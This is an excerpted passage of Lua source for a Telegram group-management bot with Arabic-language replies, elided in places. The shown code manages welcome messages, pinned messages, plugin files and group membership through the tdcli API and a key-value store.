send(msg.chat_id_, msg.id_,"\n☆︙الملف ↫ *"..FileName.."*\n☆︙تم تعطيله وحذفه من البوت بنجاح") 
dofile('AFS.lua')  
else
send(msg.chat_id_, msg.id_,"☆︙ماكو ملف بهذا الاسم") 
end
end
...
DevALS:del(AFS..'ALS:Text:BotWelcome')
DevALS:del(AFS..'ALS:Photo:BotWelcome')
return false
end 
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم تفعيل الترحيب عند اضافة البوت في الكروب', 1, 'md')   
DevALS:del(AFS..'ALS:Lock:BotWelcome')
return false
end 
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم تعطيل الترحيب عند اضافة البوت في الكروب', 1, 'md')   
DevALS:set(AFS..'ALS:Lock:BotWelcome',true)
return false
end 
...
DevALS:del(AFS..'ALS:Text:BotWelcome')
DevALS:del(AFS..'ALS:Photo:BotWelcome')
DevALS:set(AFS.."ALS:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevALS:get(AFS.."ALS:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر", 1, "md") 
DevALS:del(AFS.."ALS:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ النص ارسل لي صورة الترحيب\n☆︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevALS:set(AFS.."ALS:Text:BotWelcome",text) 
DevALS:set(AFS.."ALS:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevALS:get(AFS.."ALS:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevALS:set(AFS.."ALS:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevALS:setex(AFS.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevALS:del(AFS.."DevText")
end end
--     Source AFS     --
if DevALS:get(AFS.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر", 1, "md") 
DevALS:del(AFS.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevALS:del(AFS.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevALS:set(AFS..'ALS:ChText',texxt)
...
DevALS:setex(AFS.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
DevALS:incr(AFS..'ALS:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevALS:get(AFS..'ALS:Lock:EditMsgs'..msg.chat_id_) and not Text and not ALSConstructor(result) then
...
local GetMsgPin = DevALS:get(AFS..'ALS:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevALS:del(AFS..'ALS:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALS:del(AFS..'ALS:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=AFS,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevALS:srem(AFS..'ALS:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevALS:srem(AFS..'ALS:Groups',v)  
end
